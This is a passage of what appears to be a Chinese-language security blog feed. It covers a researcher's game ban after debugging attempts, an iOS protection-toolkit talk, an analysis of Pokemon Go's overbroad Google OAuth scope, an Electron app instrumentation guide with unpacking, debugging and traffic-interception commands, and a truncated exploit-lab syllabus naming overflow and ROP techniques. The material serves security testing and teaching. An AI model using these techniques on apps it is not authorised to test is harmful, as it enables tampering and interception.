&lt;p&gt;为避免影响其他玩家，我在游戏主菜单界面尝试了两种内存读取方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先附加WinDbg调试器，游戏立即退出（可能触发封禁）&lt;/li&gt;
&lt;li&gt;随后尝试暂停进程进行内存转储，仅获取主菜单状态的内存镜像后正常退出&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过数日分析，我因二进制文件体积庞大且结构复杂决定暂缓项目。但一个月后账号仍遭封禁，导致疫情期间通过游戏与亲友建立的联系及一年多的游戏进度全部丢失。&lt;/p&gt;
&lt;h2 id=&#34;行业对比与反思&#34;&gt;行业对比与反思
&lt;/h2&gt;&lt;p&gt;此前我在CTF比赛中对《CS:GO》进行逆向工程和模糊测试时从未面临封禁风险。Valve不仅常规接收漏洞报告，还曾向研究者支付18,000美元漏洞奖金。游戏作弊确实是破坏玩家体验的首要威胁，开发者需要综合多种信号检测作弊行为。但动视可能因缺乏安全研究先例，将任何逆向工程尝试都视为恶意行为——普通玩家确实不会附加调试器，因此开发者可能认为无需更多证据即可封禁。&lt;/p&gt;
&lt;p&gt;需要明确的是：我从未试图开发或使用作弊工具，也从未为自身或他人篡改游戏数据。至今我仍不清楚具体触发封禁的原因，且没有申诉渠道。更令人担忧的是，这种机制可能导致日常工作需要使用逆向工具的安全人员被误判。&lt;/p&gt;
&lt;h2 id=&#34;建议与展望&#34;&gt;建议与展望
&lt;/h2&gt;&lt;p&gt;希望动视能解封我的账号，更重要的是建立安全研究豁免机制：包括明确安全研究的合法边界、设置漏洞报告联系渠道（甚至漏洞赏金计划）。随着PC平台反作弊工作的难度和争议性日益增加，动视应当效仿Valve等厂商，与安全研究者建立共生而非对立的关系。通过协作，我们才能共同抵御作弊者和恶意用户的威胁。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入iOS安全与编译器理论：MAST移动应用安全工具包解析</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5ios%E5%AE%89%E5%85%A8%E4%B8%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%90%86%E8%AE%BAmast%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 21:58:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5ios%E5%AE%89%E5%85%A8%E4%B8%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%90%86%E8%AE%BAmast%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;什么是code-as-craft&#34;&gt;什么是Code as Craft？
&lt;/h3&gt;&lt;p&gt;Etsy的Code as Craft活动是每月两次的嘉宾演讲系列，聚焦技术主题或计算趋势，既分享概念性思想也提供实用建议。所有讲座将在布鲁克林华盛顿街55号7楼的Etsy实验室（712室）举行。&lt;/p&gt;
&lt;h3 id=&#34;演讲内容是什么&#34;&gt;演讲内容是什么？
&lt;/h3&gt;&lt;p&gt;Sophia将探讨iOS安全最新进展及其与编译器理论的交叉点。重点介绍移动应用安全工具包MAST——该项目已从DARPA概念验证发展为完整的移动应用防护套件，集成以下关键技术：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;越狱检测&lt;/strong&gt;：识别设备安全环境&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反调试&lt;/strong&gt;：阻止动态分析攻击&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于LLVM的反逆向&lt;/strong&gt;：在编译器层面实现保护机制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;演讲将分析当前iOS攻击态势，指出苹果原生API的防御不足，并演示MAST如何为高风险应用提供超越系统原生的保护方案。该工具现已开放测试，参与者可联系获取试用。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>揭秘Pokemon Go过度获取Google账户权限的技术内幕</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98pokemon-go%E8%BF%87%E5%BA%A6%E8%8E%B7%E5%8F%96google%E8%B4%A6%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/</link>
        <pubDate>Sun, 03 Aug 2025 19:24:40 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98pokemon-go%E8%BF%87%E5%BA%A6%E8%8E%B7%E5%8F%96google%E8%B4%A6%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E6%8A%80%E6%9C%AF%E5%86%85%E5%B9%95/</guid>
        <description>&lt;h1 id=&#34;为何今天我没抓到任何精灵---trail-of-bits技术调查&#34;&gt;为何今天我没抓到任何精灵 - Trail of Bits技术调查
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Dan Guido&lt;/strong&gt;&lt;br&gt;
2016年7月11日&lt;br&gt;
apple, authentication, privacy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt; 当全网疯狂时，我们展开了技术调查。以下是关于Pokemon Go申请Google账户权限的技术笔记。&lt;/p&gt;
&lt;h2 id=&#34;调查过程&#34;&gt;调查过程
&lt;/h2&gt;&lt;p&gt;今天下午6点左右，我和Jay展开了以下技术工作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确认Pokemon Go实际请求的权限&lt;/li&gt;
&lt;li&gt;研究这些权限的真实功能&lt;/li&gt;
&lt;li&gt;在测试应用中复现权限获取&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;逆向工程分析&#34;&gt;逆向工程分析
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;openid
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;email
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://www.google.com/accounts/OAuthLogin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://www.googleapis.com/auth/userinfo.email
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其中&lt;code&gt;OAuthLogin&lt;/code&gt;scope异常突出，该权限通常仅限Google自家应用（如Chrome和iOS账户管理器）使用。我们在Github上仅发现少数项目使用它。&lt;/p&gt;
&lt;h3 id=&#34;oauth技术验证&#34;&gt;OAuth技术验证
&lt;/h3&gt;&lt;p&gt;通过Google官方OAuth Playground测试时，该scope会返回&amp;quot;未授权&amp;quot;错误，说明Playground无法复现Pokemon Go的权限请求。这可能是Google 2012年弃用、2015年关闭的OAuth 1.0 API残留。但令人困惑的是，已迁移到OAuth 2.0的账户按理不应再能使用旧版API。&lt;/p&gt;
&lt;h2 id=&#34;安全缺陷分析&#34;&gt;安全缺陷分析
&lt;/h2&gt;&lt;p&gt;Pokemon Go登录流程存在三大问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;未明确告知请求的权限内容&lt;/li&gt;
&lt;li&gt;用户撤销权限后会自动重新启用&lt;/li&gt;
&lt;li&gt;现有文档未充分说明令牌权限含义&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虽然Niantic声称只需要基础资料，但通过&lt;code&gt;UberAuth&lt;/code&gt;令牌可升级获取包括Gmail在内的全账户访问权限（详见&lt;a class=&#34;link&#34; href=&#34;https://gist.github.com/arirubinstein/fd5453537436a8757266f908c3e41538&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;技术细节&lt;/a&gt;）。&lt;/p&gt;
&lt;h2 id=&#34;厂商响应与解决方案&#34;&gt;厂商响应与解决方案
&lt;/h2&gt;&lt;p&gt;Niantic最终承认错误并发布声明：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;iOS版Pokemon GO错误地请求了Google账户的完全访问权限&amp;hellip;实际上仅访问基本资料信息&amp;hellip;正在通过客户端更新修正权限请求&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Google将采取两项措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对已发放的令牌进行降权&lt;/li&gt;
&lt;li&gt;阻止新用户授予过度权限&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;建议用户&lt;/strong&gt;：立即在Google安全设置中撤销Pokemon Go权限，登出后重新登录以获取修正后的权限。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;更新记录&lt;/em&gt;&lt;br&gt;
2016/7/12：确认&amp;quot;UberAuth&amp;quot;令牌可通过未公开方法升级获取全账户权限&lt;br&gt;
2016/7/13：应用已更新为仅请求基础权限&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Electron应用安全测试工具化指南</title>
        <link>http://localhost:1313/p/electron%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8C%96%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sun, 03 Aug 2025 10:18:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/electron%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8C%96%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;electron应用安全测试工具化指南&#34;&gt;Electron应用安全测试工具化指南
&lt;/h1&gt;&lt;p&gt;随着Electron框架的流行，我们总结了以下技术手段用于对Electron应用进行工具化改造、行为修改和深度安全评估。&lt;/p&gt;
&lt;h2 id=&#34;electron进程架构&#34;&gt;Electron进程架构
&lt;/h2&gt;&lt;p&gt;Electron框架使用HTML、JavaScript和CSS开发跨平台桌面应用，其核心由Node.js和Chromium的libchromiumcontent模块组成。主进程运行package.json的主脚本，负责启动其他进程；渲染进程则用于显示网页内容。&lt;/p&gt;
&lt;h2 id=&#34;解包asar存档&#34;&gt;解包ASAR存档
&lt;/h2&gt;&lt;p&gt;首先需要解压应用的.asar文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g asar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;asar extract core.asar destinationfolder
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;典型的Electron应用包含index.js、index.html和package.json三个文件，其中package.json指定了应用入口文件。&lt;/p&gt;
&lt;h2 id=&#34;处理混淆代码&#34;&gt;处理混淆代码
&lt;/h2&gt;&lt;p&gt;对于未混淆代码可直接分析，如遇混淆代码需结合工具和手工逆向：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 混淆代码示例
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*...*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*...*/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\x62\\x20\\x35...&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,...));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 反混淆后
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;NewObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentsOfMyTextFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SayHello&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;theLibrary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;_1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentsOfMyTextFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;theLibrary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;启用渲染进程开发者工具&#34;&gt;启用渲染进程开发者工具
&lt;/h2&gt;&lt;p&gt;在主进程创建BrowserWindow时添加：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;webContents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;openDevTools&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bottom&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setMenuBarVisibility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;调试主进程&#34;&gt;调试主进程
&lt;/h2&gt;&lt;p&gt;使用以下命令启动应用进行调试：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;electron --inspect&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5858&lt;/span&gt; your-app
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;然后通过Chrome访问chrome://inspect进行调试。&lt;/p&gt;
&lt;h2 id=&#34;拦截https流量&#34;&gt;拦截HTTP(S)流量
&lt;/h2&gt;&lt;p&gt;可通过以下方式设置代理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;commandLine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendSwitch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;proxy-server&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;127.0.0.1:8080&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;对于Node.js环境：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; proxy http://localhost:8080
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm config &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; https-proxy http://localhost:8081
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;安全建议&#34;&gt;安全建议
&lt;/h2&gt;&lt;p&gt;完整的测试需要结合静态代码审查、动态测试和客户端工具化技术，通过全面覆盖代码路径来发现潜在漏洞。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>漏洞利用实验室：Blackhat 2016漏洞实验课程 - 课前教程与破解挑战</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</link>
        <pubDate>Sun, 03 Aug 2025 03:03:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;blackhat-2016漏洞实验课程&#34;&gt;Blackhat 2016漏洞实验课程
&lt;/h1&gt;&lt;h2 id=&#34;课前教程模块&#34;&gt;课前教程模块
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基础缓冲区溢出&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;32位栈溢出原理与实践&lt;/li&gt;
&lt;li&gt;通过恶意输入覆盖EIP寄存器&lt;/li&gt;
&lt;li&gt;使用坏字符检测定位内存冲突&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;现代绕过技术&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DEP/NX保护机制的ROP链构造&lt;/li&gt;
&lt;li&gt;绕过ASLR的内存地址泄露技术&lt;/li&gt;
&lt;li&gt;使用JIT喷射对抗控制流保护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;crackme挑战集&#34;&gt;Crackme挑战集
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level1&lt;/strong&gt;&lt;br&gt;
基础栈溢出（无保护机制）&lt;br&gt;
要求：通过覆盖返回地址执行shellcode&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level2&lt;/strong&gt;&lt;br&gt;
带Canary保护的栈溢出&lt;br&gt;
要求：爆破/泄露栈金丝雀值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Level3&lt;/strong&gt;&lt;br&gt;
